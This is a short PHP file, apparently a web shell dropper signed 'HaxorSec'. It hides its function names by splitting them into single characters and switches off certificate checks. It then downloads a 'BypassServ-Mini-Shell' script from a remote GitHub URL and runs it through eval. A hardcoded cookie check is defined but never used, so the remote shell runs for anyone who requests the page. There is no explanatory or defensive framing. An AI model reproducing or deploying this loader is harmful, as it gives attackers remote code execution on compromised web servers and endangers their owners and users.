HaxorSec
<?php
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
}

    function geturlsinfo($url)
    {
      $fpn = "f"."o"."p"."e"."n";
      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
        if (function_exists($cexec)) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $urls = $cexec($conn);
            curl_close($conn);
        } elseif (function_exists($fgt)) {
            $urls = $fgt($url);
        } elseif (function_exists($fpn) && function_exists($strim)) {
            $handle = $fpn($url, "r");
            $urls = $strim($handle);
            fclose($handle);
        } else {
            $urls = false;
        }
        return $urls;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
    eval('?>' . $a);

?>
